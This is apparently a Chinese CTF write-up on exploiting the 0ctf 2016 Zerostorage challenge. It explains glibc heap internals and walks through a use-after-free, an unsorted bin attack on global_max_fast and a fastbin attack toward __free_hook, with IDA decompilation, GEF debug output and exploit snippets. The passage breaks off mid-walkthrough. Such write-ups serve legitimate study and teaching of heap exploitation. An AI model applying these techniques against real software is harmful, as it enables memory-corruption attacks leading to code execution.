<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void malloc_consolidate(mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 /* current fastbin being consolidated */</span><br><span class="line">  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */</span><br><span class="line">  mchunkptr       p;                  /* current chunk being consolidated */</span><br><span class="line">  mchunkptr       nextp;              /* next chunk to consolidate */</span><br><span class="line">  mchunkptr       unsorted_bin;       /* bin header */</span><br><span class="line">  mchunkptr       first_unsorted;     /* chunk to link to */</span><br><span class="line"></span><br><span class="line">  /* These have same use as in free() */</span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  if (!prev_inuse(p)) &#123;</span><br><span class="line">	    prevsize = p-&gt;prev_size;</span><br><span class="line">	    size += prevsize;</span><br><span class="line">	    p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">	    unlink(av, p, bck, fwd);                      //--------------&gt;调用unlink</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">   if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	    if (!nextinuse) &#123;</span><br><span class="line">	      size += nextsize;</span><br><span class="line">	      unlink(av, nextchunk, bck, fwd);            //-------------&gt; 调用unlink</span><br><span class="line">	    &#125; else</span><br><span class="line">	      clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free函数中的两次调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">_int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        /* its size */</span><br><span class="line">  mfastbinptr *fb;             /* associated fastbin */</span><br><span class="line">  mchunkptr nextchunk;         /* next contiguous chunk */</span><br><span class="line">  INTERNAL_SIZE_T nextsize;    /* its size */</span><br><span class="line">  int nextinuse;               /* true if nextchunk is used */</span><br><span class="line">  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */</span><br><span class="line">  mchunkptr bck;               /* misc temp for linking */</span><br><span class="line">  mchunkptr fwd;  </span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">      /* consolidate backward */</span><br><span class="line">    if (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);      //---------------------------&gt;调用unlink</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      /* get and clear inuse bit */</span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      /* consolidate forward */</span><br><span class="line">      if (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);    //---------------------------&gt;调用unlink</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; else</span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>而对于从unsorted bin中malloc的逻辑，是直接这样改写的指针，并没有借用unlink函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>我们通过调试观察是否&amp;remissions</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx &amp;remissions </span><br><span class="line">0x555555756018 &lt;remissions&gt;:    0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>而指向的unsorted bin的前面的地址是main_arena + 88的地址<br>main_arena的地址为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  heap arenas </span><br><span class="line">Arena (base=0x7ffff7dd1b20</span><br></pre></td></tr></table></figure>
<p>0x7ffff7dd1b20 + 88 = 0x7ffff7dd1b78<br>这种unsorted bin一种典型的应用就是泄露libc的地址。</p>
<h3 id="0ctf-2016-Zerostorage"><a href="#0ctf-2016-Zerostorage" class="headerlink" title="0ctf 2016 - Zerostorage"></a>0ctf 2016 - Zerostorage</h3><p>题目的<a href="https://github.com/ctfs/write-ups-2016/blob/master/0ctf-2016/exploit/zerostorage-6/zerostorage.tar.gz">下载地址</a></p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在merge函数中，如果两个index相同，则会造成UAF，即原来的chunk被free放到unsorted bin中，同时误以为已经merge，被free的chunk还是可以被访问。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于本题有分配大小的限制，小于0x80的不能分配，因此直接使用fastbin attack将会受到限制，但是我们可以通过unsorted bin先修改global_max_fast的值，使得即使分配大于0x80的chunk，仍然使用的是fast bin，这样就绕过了长度限制，后面就是常规的fastbin attck利用技术。难点主要是global_max_fast的改写，具体流程见下图<br><img src="pastimages/2021-05-31-15-52-16.png"></p>
<h3 id="关键步骤调试记录"><a href="#关键步骤调试记录" class="headerlink" title="关键步骤调试记录"></a>关键步骤调试记录</h3><h4 id="如何确定global-max-fast的地址"><a href="#如何确定global-max-fast的地址" class="headerlink" title="如何确定global_max_fast的地址"></a>如何确定global_max_fast的地址</h4><p>在网上看了几篇文章的解，我只看到了直接通过gdb打印出global_max_fast的地址的解，但是我用自己下载的libc，并没有这个global_max_fast符号，因为这是一个static变量，是可以被strip去符号的。不太清楚别人是怎么搞得，我只能通过原理上去找这个地址。</p>
<p>首先通过ida打开libc的二进制文件，然后在源码中查找处理global_max_fast这个值的函数。<br>我在mallopt函数中找到了set_max_fast</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int</span><br><span class="line">__libc_mallopt (int param_number, int value)</span><br><span class="line">&#123;</span><br><span class="line">  mstate av = &amp;main_arena;</span><br><span class="line">  int res = 1;</span><br><span class="line"></span><br><span class="line">  if (__malloc_initialized &lt; 0)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">  (void) mutex_lock (&amp;av-&gt;mutex);</span><br><span class="line">  /* Ensure initialization/consolidation */</span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_mallopt, 2, param_number, value);</span><br><span class="line"></span><br><span class="line">  switch (param_number)</span><br><span class="line">    &#123;</span><br><span class="line">    case M_MXFAST:</span><br><span class="line">      if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ());</span><br><span class="line">          set_max_fast (value);  // 设置global max fast值</span><br><span class="line">        &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>set_max_fast是一个宏定义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define set_max_fast(s) \</span><br><span class="line">  global_max_fast = (((s) == 0)						      \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure>
<p>做的事情就是给global_max_fast赋值。</p>
<p>在ida中查找类似的代码，首先找到了mallopt这个函数，由于这个函数是一个对外输出的函数，所以是不能被strip掉的，这也是为什么通过这个函数找global_max_fast的原因。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall mallopt(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rbp</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  unsigned __int64 v5; // rax</span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  if ( dword_3C3144 &lt; 0 )</span><br><span class="line">    sub_849E0();</span><br><span class="line">  _ESI = 1;</span><br><span class="line">  if ( !dword_3C87A0 )</span><br><span class="line">  &#123;</span><br><span class="line">    __asm &#123; cmpxchg cs:dword_3C3B20, esi &#125;</span><br><span class="line">    if ( !dword_3C87A0 )</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( _InterlockedCompareExchange(&amp;dword_3C3B20, 1, 0) )</span><br><span class="line">LABEL_7:</span><br><span class="line">    sub_1147C0(&amp;dword_3C3B20, 1LL);</span><br><span class="line">LABEL_8:</span><br><span class="line">  sub_7E460(&amp;dword_3C3B20, 1LL);</span><br><span class="line">  switch ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    case -8:</span><br><span class="line">      if ( (int)v2 &lt;= 0 )</span><br><span class="line">        goto LABEL_24;</span><br><span class="line">      v4 = 1LL;</span><br><span class="line">      qword_3C3180 = v2;</span><br><span class="line">      break;</span><br><span class="line">    case -7:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    case 1:</span><br><span class="line">      v4 = 0LL;</span><br><span class="line">      if ( (unsigned int)v2 &lt;= 0xA0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = 16LL;</span><br><span class="line">        if ( (_DWORD)v2 )</span><br><span class="line">          v5 = ((int)v2 + 8LL) &amp; 0xFFFFFFFFFFFFFFF0LL;</span><br><span class="line">        qword_3C5848 = v5;   // --------------------------&gt; global_max_fast</span><br><span class="line">        v4 = 1LL;</span><br><span class="line">      &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<p>看了一下结构应该是同一个函数，找到switch对应的1分支，可以推断出qword_3C5848这个就是global_max_fast，所以在这个libc的偏移中，他相对文件头的偏移是0x3c5848。所以就可以借助泄露的main_arena+88的地址，推断出这个global_max_fast的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx 0x00007ffff7bff000 + 0x3c5848</span><br><span class="line">0x7ffff7fc4848: 0x0000000000000080</span><br></pre></td></tr></table></figure>
<p>通过gdb查看libc加载的基地址是0x00007ffff7bff000，观察偏移0x3c5848的值为0x80,这就是默认情况下fastbin的最大为0x80，所以可以证明我们的这种方法找global_max_fast是可行的。</p>
<h4 id="unsorted-bin-attack的利用"><a href="#unsorted-bin-attack的利用" class="headerlink" title="unsorted bin attack的利用"></a>unsorted bin attack的利用</h4><p>通过UAF我们可以改写merge后的chunk的bk指针为指向&amp;global_max_fast - 2的地址，目的是在unsorted bin上分配chunk的时候，会造成前后两个chunk的fd和bk指针的改写，在本题中就是unsorted bin中的bk指向&amp;global_max_fast - 2,而global_max_fast被存储了main_arena + 88的值。</p>
<p>我们在GEF中观察结果<br>首先在分配chunk之前，unsorted bin的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &#x27;*0x7ffff7fc2b20&#x27; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758000, bk=0x555555758000</span><br><span class="line"> →   Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>
<p>index为2的chunk2的bk指针通过UAF漏洞改写为&amp;global_max_fast - 2, 通过之前的描述我们已经确定了global_max_fast地址为0x7ffff7fc4848</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx 0x555555758010 +8</span><br><span class="line">0x555555758018: 0x00007ffff7fc4838</span><br></pre></td></tr></table></figure>
<p>通过GDB的结果可以看到我们已经成功修改了chunk2的bk指针，使其指向了&amp;global_max_fast - 2</p>
<p>在分配一个0x90大小的chunk之后，我们观察unsorted bin是如何变化的.<br>首先观察unsorted  bin bk指针的指向</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx 0x00007ffff7fc2b78 + 8*3    // 0x00007ffff7fc2b78这个是main_arena+88的地址，即main_arena.top的地址</span><br><span class="line">0x7ffff7fc2b90: 0x00007ffff7fc4838      //unsorted  bin -&gt; bk为 0x00007ffff7fc4838</span><br></pre></td></tr></table></figure>
<p>因此我们可以看到unsorted bin的bk指针已经改写为&amp;global_max_fast - 2</p>
<p>而global_max_fast值改为0x00007ffff7fc2b78， 我们成功将一个原本只有0x80大小的global_max_fast，改为了一个很大的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx 0x00007ffff7fc4838 + 8*2</span><br><span class="line">0x7ffff7fc4848: 0x00007ffff7fc2b78</span><br></pre></td></tr></table></figure>


<h3 id="选择合适的fastbin-chunk大小"><a href="#选择合适的fastbin-chunk大小" class="headerlink" title="选择合适的fastbin chunk大小"></a>选择合适的fastbin chunk大小</h3><p>虽然我们现在可以分配很大的fastbin chunk，但是fast chunk在给用户返回堆块之前会有一个校验，它会检查返回给用户的堆块大小是否是合法的。我们的总体目标是能够 让fast chunk返回一个malloc_hook或者free_hook附近的地址。我们通过在他们附近查找是否有合适的值能够绕过fast chunk的校验。我在malloc_hook地址附近没有发现合适的值，但是在free_hook附近发现了一个0x200的值，这个size是满足我们的要求的。</p>
<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>我们确定好了我们的目标fastbin chunk的大小为0x200，我们首先通过业务功能分配一个0x200大小的chunk，然后同样的merge这个chunk得到一个UAF的原型。此时内存上应该是有一个chunk是存放在fastbin上的。并且我们是可以访问这个被free的chunk。我们通过创建节点直接分配0x200的chunk的时候会出错。</p>
<p>为什么会出错？bug调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  bt</span><br><span class="line">#0  0x00007ffff7d41e8e in __libc_dlopen_mode () from ./libc.so.6</span><br><span class="line">#1  0x00007ffff7d14301 in backtrace () from ./libc.so.6</span><br><span class="line">#2  0x00007ffff7c1e9f5 in ?? () from ./libc.so.6</span><br><span class="line">#3  0x00007ffff7c76725 in ?? () from ./libc.so.6</span><br><span class="line">#4  0x00007ffff7c80f01 in ?? () from ./libc.so.6</span><br><span class="line">#5  0x00007ffff7c8334a in calloc () from ./libc.so.6</span><br><span class="line">#6  0x0000555555555057 in ?? ()</span><br><span class="line">#7  0x0000555555554d57 in ?? ()</span><br><span class="line">#8  0x00007ffff7c1f830 in __libc_start_main () from ./libc.so.6</span><br><span class="line">#9  0x0000555555554d9a in ?? ()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>0x200大小对应的index值是30，相对于fastbin数组的开始距离为 30 *8 = 240<br>0x80对应的是6</p>
<p>fastbin 相对于main_arena 就是+8</p>
<p>所以就是 main_arena + 8 + 240的地址是否有值，如果有值就不能当做我们的chunk 大小</p>
<p>后来发现我选在fast chunk大小为0x200是无法分配成功的，原因是因为0x200所对应 fastbin上有值的，这就导致会进入判断size，这个size显然不能通过校验,如何能绕过这个校验呢？这就涉及到需要充分利用题目中的realloc函数。</p>
<h3 id="libc-realloc函数的分析"><a href="#libc-realloc函数的分析" class="headerlink" title="__libc_realloc函数的分析"></a>__libc_realloc函数的分析</h3><h4 id="两个特殊情况"><a href="#两个特殊情况" class="headerlink" title="两个特殊情况"></a>两个特殊情况</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> #if REALLOC_ZERO_BYTES_FREES</span><br><span class="line">  if (bytes == 0 &amp;&amp; oldmem != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); return 0;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
<p>这段是说，当realloc(有效值，0)相当于free的功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* realloc of null is supposed to be same as malloc */</span><br><span class="line">if (oldmem == 0)</span><br><span class="line">  return __libc_malloc (bytes);</span><br></pre></td></tr></table></figure>
<p>这段的意思当oldmem如果为空的话，相当于malloc</p>
<h4 id="一般情况"><a href="#一般情况" class="headerlink" title="一般情况"></a>一般情况</h4><p>就是正常的oldmem和正常的size。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* chunk corresponding to oldmem */</span><br><span class="line">  const mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  /* its size */</span><br><span class="line">  const INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))</span><br><span class="line">    ar_ptr = NULL;</span><br><span class="line">  else</span><br><span class="line">    ar_ptr = arena_for_chunk (oldp);</span><br></pre></td></tr></table></figure>
<p>首先会根据oldmem得到它的chunk的大小，然后在判断一下这个堆是由mmap分配的吗。我们这种情况并不是mmap分配，因此跳过，继续看下面的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line"> if (newp == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try harder to allocate memory in other arenas.  */</span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      if (newp != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          memcpy (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class="line">          _int_free (ar_ptr, oldp, 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return newp;</span><br></pre></td></tr></table></figure>
<p>会先尝试调用_int_realloc函数，如果调用成功就返回，如果调用不成功则直接用malloc实现。由于我们的uaf原型不能让流程进入到由malloc逻辑。具体解释下原因，如果用malloc实现的，那么返回的地址是和old mem不一样的，由于后面会对oldp给free，因此原来的merge(index1,index1)， index1的这块内容就被释放了，在业务代码中会把index1再释放一遍，这实际上就是一个double free的原型，并不是UAF，double free的原型的利用比较困难，现在还没有兴趣去研究。</p>
<p>综上原因，我们一定要让_int_realloc分配成功，下面看_int_realloc的具体逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (next == av-&gt;top &amp;&amp;</span><br><span class="line">         (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">         (unsigned long) (nb + MINSIZE))</span><br><span class="line">       &#123;</span><br><span class="line">         set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">         av-&gt;top = chunk_at_offset (oldp, nb);</span><br><span class="line">         set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">         check_inuse_chunk (av, oldp);</span><br><span class="line">         return chunk2mem (oldp);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>这个有个关键的一个逻辑，就是如果这个老的指针指向的chunk和top是紧邻的，那么分配的时候就是直接从top上再扩展一点儿额外的空间，相当于还是返回老的指针，这个逻辑就符合我们的预期，只有这样才能再重构UAF漏洞原型。</p>
<p>最关键的是这样还可以避免在malloc的fast chunk的时候出错，由于直接用新建逻辑的时候调用的是calloc，相当于malloc，这个会直接进入校验逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = fastbin_index (nb);</span><br><span class="line">     mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">     mchunkptr pp = *fb;</span><br><span class="line">     do</span><br><span class="line">       &#123;</span><br><span class="line">         victim = pp;</span><br><span class="line">         if (victim == NULL)    </span><br><span class="line">           break;</span><br><span class="line">       &#125;</span><br><span class="line">     while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">            != victim);</span><br><span class="line">     if (victim != 0)   //----------------&gt; 0x200的时候这个地方会不为空</span><br><span class="line">       &#123;</span><br><span class="line">         if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">           &#123;</span><br><span class="line">             errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">           errout:</span><br><span class="line">             malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">             return NULL;</span><br><span class="line">           &#125;</span><br><span class="line">         check_remalloced_chunk (av, victim, nb);</span><br><span class="line">         void *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         return p;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>当请求的size为0x200的时候，fastbin 对应的fd是存在值的，所以会执行<code>if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</code>，相当于会去检查这个指针指向的chunk size，由于这个是个我们不能控制的值，所以不能通过校验，因此通过单纯的创建节点的逻辑调用calloc得到一个符合fastbin 大小的chunk是不能通过的。</p>
<p>因此我们要试验，如何能够通过merge逻辑调用realloc得到一个符合大小的chunk。</p>
<h3 id="通过realloc得到一个0x200大小的chunk"><a href="#通过realloc得到一个0x200大小的chunk" class="headerlink" title="通过realloc得到一个0x200大小的chunk"></a>通过realloc得到一个0x200大小的chunk</h3><p>尝试通过分配0x100的chunk，然后merge，发现在insert(0xf0)的时候同样会不能通过fast chunk的size校验，原因是同样，但是我们可以在修改global_max_fast之前就分配这个。然后等到修改完后再尝试merge。<br>对应的exp代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line">insert(0x20, &quot;B&quot; * 0x1f)  # 1</span><br><span class="line">merge(0, 0)            </span><br><span class="line">insert(0xf0,&quot;G&quot;*0xef)    # 3</span><br></pre></td></tr></table></figure>

<p>我们在第一次merge之后，修改max_fast之前申请一个0x100的chunk，观察内存情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     f8 2b fc f7 ff 7f 00 00 f8 2b fc f7 ff 7f 00 00    .+.......+......]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x100, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     47 47 47 47 47 47 47 47 47 47 47 47 47 47 47 47    GGGGGGGGGGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758230, size=0x20de0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到此时我们的这个chunk确实是与top chunk紧邻的，这符合我们的预期的。</p>
<p>但是却发现，在我们分配这个0x100的大小的chunk之后，却导致原来在unsorted bin中的chunk被放到了small bin中了。这是因为merge之后,在unsorted bin上已经有一个元素了，而且我们新申请的这个0x100大小的chunk会触发从unsorted bin上回收chunk到对应的bin上的逻辑，libc中的对应源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)&#123;</span><br><span class="line">          ...</span><br><span class="line">          /* place chunk in bin */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">               ...</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>这就导致我们后续利用unsorted bin进行改写max fast出错。因此我们不能触发这个逻辑，所以就要修改我们的创建节点的顺序,我们的exp需要改写为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line">insert(0x20, &quot;B&quot; * 0x1f)  # 1       </span><br><span class="line">insert(0xf0,&quot;G&quot;*0xef)    # 2</span><br><span class="line">merge(0, 0)     </span><br></pre></td></tr></table></figure>
<p>即在merge之前分配这个chunk，而且要在第三个创建这个0x100的chunk，这样才能保证与top chunk是紧邻的。</p>
<p>这样我们在merge之前再次观察内存情况，可以发现目前为止我们的0x100的chunk的确是与top chunk紧邻的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x100, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     47 47 47 47 47 47 47 47 47 47 47 47 47 47 47 47    GGGGGGGGGGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758230, size=0x20de0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在merge之后，我们再次观察是否chunk0成功回收到了unsorted bin上，并且chunk2仍然与top chunk紧邻</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     78 2b fc f7 ff 7f 00 00 78 2b fc f7 ff 7f 00 00    x+......x+......]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x100, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     47 47 47 47 47 47 47 47 47 47 47 47 47 47 47 47    GGGGGGGGGGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758230, size=0x20de0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line">gef➤  heap bins unsorted</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena &#x27;*0x7ffff7fc2b20&#x27; ─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758000, bk=0x555555758000</span><br><span class="line"> →   Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in unsorted bin.</span><br></pre></td></tr></table></figure>
<p>可以看到我们的确实现了预期的效果。</p>
<p>但是在merge之后发现融合后的chunk只有0x1f0大，这个是因为由于合并不需要两个0x100，而是是0x100 +0xf0，第二个chunk的头部是不需要的。所以我们应该微调分配的大小，我改为了0xf8这么大之后再融合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43    CCCCCCCCCCCCCCCC]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x200, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     08 2c fc f7 ff 7f 00 00 47 47 47 47 47 47 47 47    .,......GGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758330, size=0x20ce0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到我们已经得到了我们想要的0x200</p>
<p>我们查看对应的fast bin上（已经远超了fastbin的范围）的存放的chunk是否正确</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b20 + 8 +  30*8</span><br><span class="line">0x7ffff7fc2c18: 0x0000555555758120</span><br></pre></td></tr></table></figure>
<p>可以看到存放的就是我们刚才merge过后的0x20的chunk，所以我们已经完成了fast bin的布局。</p>
<h3 id="拿到free-hook内存附近的控制权"><a href="#拿到free-hook内存附近的控制权" class="headerlink" title="拿到free_hook内存附近的控制权"></a>拿到free_hook内存附近的控制权</h3><p>我们完成了fastbin的布局，就可以利用UAF漏洞原型修改fastbin chunk的fd指针，进而在两次分配之后，拿到这个fd指针。<br>修改fd的exp代码是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">malloc_free_hook_target_addr = 0x1bdf + leak_main_arena_88 - 8</span><br><span class="line">edit(4, 0x1f0,p64(malloc_free_hook_target_addr))  </span><br></pre></td></tr></table></figure>
<p>0x1f0这个大小必须要正确，因为如果不是这个值，就会进入一个realloc流程，不要进入这个流程。</p>
<p>同样在gdb中观察是否写入正确</p>
